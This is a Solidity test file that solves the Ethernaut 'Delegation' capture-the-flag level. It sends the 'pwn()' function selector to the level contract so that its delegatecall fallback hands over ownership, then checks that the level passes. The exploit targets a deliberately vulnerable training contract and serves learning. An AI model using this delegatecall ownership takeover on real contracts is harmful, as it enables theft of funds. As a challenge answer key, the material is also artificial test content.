
pragma solidity ^0.8.17;

import "ds-test/test.sol";
import "../src/Delegation/DelegationFactory.sol";
import "../src/Ethernaut.sol";
import "./utils/vm.sol";

contract DelegationTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;
    address eoaAddress = address(100);

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(eoaAddress, 5 ether);
    }

    function testDelegationHack() public {
        DelegationFactory delegationFactory = new DelegationFactory();
        ethernaut.registerLevel(delegationFactory);

        vm.startPrank(eoaAddress);
        address levelAddress = ethernaut.createLevelInstance(delegationFactory);
        Delegation ethernautDelegation = Delegation(address(levelAddress));

        // START
        bytes4 method = bytes4(keccak256("pwn()"));

        address(ethernautDelegation).call(abi.encode(method));
        // END

        bool levelPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelPassed);
    }
}